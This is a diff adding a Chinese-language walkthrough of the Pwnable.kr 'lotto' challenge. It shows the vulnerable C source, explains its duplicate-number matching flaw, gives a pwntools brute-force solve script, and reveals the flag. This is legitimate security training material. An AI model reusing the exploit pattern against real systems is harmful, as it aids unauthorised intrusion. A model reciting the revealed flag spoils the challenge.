@@ -9723,7 +9723,7 @@ shellshock@pwnable:/tmp/t0ur1st$ python exp.py
 
 ### blackjack
 
-这是**Pwnable.kr**的第十二个挑战`coin1`，来自**[Toddler's Bottle]**部分。
+这是**Pwnable.kr**的第十二个挑战`blackjack`，来自**[Toddler's Bottle]**部分。
 
 ```bash
 Hey! check out this C implementation of blackjack game!
@@ -9941,4 +9941,178 @@ The Dealer Has a Total of 11
 
 Enter Bet: $
 ```
+
+------
+
+### lotto
+
+这是**Pwnable.kr**的第十二个挑战`lotto`，来自**[Toddler's Bottle]**部分。
+
+```bash
+Mommy! I made a lotto program for my homework.
+do you want to play?
+
+
+ssh lotto@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh lotto@pwnable.kr -p2222
+lotto@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Fri Jun  9 06:44:44 2023 from 176.231.106.46
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+lotto@pwnable:~$ ls -la
+total 44
+drwxr-x---   5 root      lotto  4096 Oct 23  2016 .
+drwxr-xr-x 117 root      root   4096 Nov 10  2022 ..
+d---------   2 root      root   4096 Feb 18  2015 .bash_history
+-r--r-----   1 lotto_pwn root     55 Feb 18  2015 flag
+dr-xr-xr-x   2 root      root   4096 Feb 18  2015 .irssi
+-r-sr-x---   1 lotto_pwn lotto 13081 Feb 18  2015 lotto
+-r--r--r--   1 root      root   1713 Feb 18  2015 lotto.c
+drwxr-xr-x   2 root      root   4096 Oct 23  2016 .pwntools-cache
+```
+
+我们可以看到三个文件`lotto`、`lotto.c`和`flag`，其中`lotto`是`ELF`二进制可执行文件，`lotto.c`是编译二进制文件的`C`代码，用户`lotto`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat lotto.c`来查看`lotto.c`的代码。
+
+```bash
+lotto@pwnable:~$ cat lotto.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+
+unsigned char submit[6];
+
+void play(){
+    int i;
+    printf("Submit your 6 lotto bytes : ");
+    fflush(stdout);
+
+    int r;
+    r = read(0, submit, 6);
+
+    printf("Lotto Start!\n");
+    //sleep(1);
+
+    // generate lotto numbers
+    int fd = open("/dev/urandom", O_RDONLY);
+    if(fd==-1){
+        printf("error. tell admin\n");
+        exit(-1);
+    }
+    unsigned char lotto[6];
+    if(read(fd, lotto, 6) != 6){
+        printf("error2. tell admin\n");
+        exit(-1);
+    }
+    for(i=0; i<6; i++){
+        lotto[i] = (lotto[i] % 45) + 1;     // 1 ~ 45
+    }
+    close(fd);
+
+    // calculate lotto score
+    int match = 0, j = 0;
+    for(i=0; i<6; i++){
+        for(j=0; j<6; j++){
+            if(lotto[i] == submit[j]){
+                match++;
+            }
+        }
+    }
+
+    // win!
+    if(match == 6){
+            system("/bin/cat flag");
+    }
+    else{
+            printf("bad luck...\n");
+    }
+
+}
+
+void help(){
+    printf("- nLotto Rule -\n");
+    printf("nlotto is consisted with 6 random natural numbers less than 46\n");
+    printf("your goal is to match lotto numbers as many as you can\n");
+    printf("if you win lottery for *1st place*, you will get reward\n");
+    printf("for more details, follow the link below\n");
+    printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
+    printf("mathematical chance to win this game is known to be 1/8145060.\n");
+}
+
+int main(int argc, char* argv[]){
+    // menu
+    unsigned int menu;
+
+    while(1){
+        printf("- Select Menu -\n");
+        printf("1. Play Lotto\n");
+        printf("2. Help\n");
+        printf("3. Exit\n");
+
+        scanf("%d", &menu);
+
+        switch(menu){
+            case 1:
+                play();
+                break;
+            case 2:
+                help();
+                break;
+            case 3:
+                printf("bye\n");
+                return 0;
+            default:
+                printf("invalid menu\n");
+                break;
+        }
+    }
+    return 0;
+}
+```
+
+游戏要求 `6` 个字节并将它们与ASCII码在 `[1-45]` 这范围内的 `6` 个随机字节进行比较，如果匹配数为 `6`，则我们赢得游戏。仔细审计代码发现程序将每个随机字节与所有6个输入字节进行比较，只要其中有一个匹配就获胜，所以我们可以输入`6`个相同的字符（其中这些字符的ASCII码数值在`[1-45]`内）来赌。编写`Python`代码求解：
+
+```python
+from pwn import *
+
+shell = ssh(user='lotto', host='pwnable.kr', port=2222, password='guest')
+io = shell.process('./lotto')
+while True:
+    io.sendlineafter('3. Exit\n', b'1')
+    io.recv()
+    io.sendline(b'-'*6)
+    _, flag = io.recvlines(2)
+    if b'bad' not in flag:
+        log.success(flag)  # sorry mom... I FORGOT to check duplicate numbers... :(
+        break
+io.close()
+shell.close()
+```
+
+提交 `sorry mom... I FORGOT to check duplicate numbers... :(` 即可。
+
+------
 
